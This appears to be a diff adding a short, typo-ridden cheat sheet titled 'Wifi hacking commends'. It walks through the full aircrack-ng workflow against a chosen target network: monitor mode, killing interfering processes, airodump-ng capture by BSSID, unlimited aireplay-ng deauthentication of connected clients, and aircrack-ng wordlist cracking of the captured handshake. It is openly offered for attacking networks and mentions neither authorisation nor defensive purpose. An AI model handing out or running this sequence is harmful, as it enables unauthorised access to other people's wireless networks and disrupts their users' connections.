@@ -1,0 +1,42 @@
+Wifi hacking commends
+
+ifconfig to check for your wireless network card
+
+iwconfig to check which mode your wireless network card is. at first it will be in the managed mode and it is by default
+
+ifconfig (the name of your wireless card) down 
+
+iwconfig (the name of your network card) mode monitor
+
+ifconfig (the name of your wireless card) up
+
+airmon-ng check (the name of your wireless card)
+
+airmon-ng check kill (enter he name of your wireless card) 
+
+
+
+After killing all the processe then put your card into monitor mode again..
+
+ifconfig (the name of your wireless card) down 
+
+iwconfig (the name of your network card) mode monitor
+
+ifconfig (the name of your wireless card) up
+
+
+
+airodump-ng (enter the name of your wireless card) to inspect the network you want to hack.
+
+airodump-ng -c 3 --bssid (enter the mac address of the netword) (enter the name of your wireless card)
+
+airodump-ng -c 3 --bssid (enter the mac address of the netword) -w (enter the name of the file you want to write to) (enter the name of your wireless card)
+
+
+aireplay-ng -0 0 -a (enter the mac address of your network) (enter the name of your wireless card)
+
+NOW FIND THE WORDLIST YOU WANT TO USE
+
+gunzip (enter the name of the file you want to unzip) 
+
+aircrack-ng -w (enter the name of your wordlist) (enter the name of the packet captured)
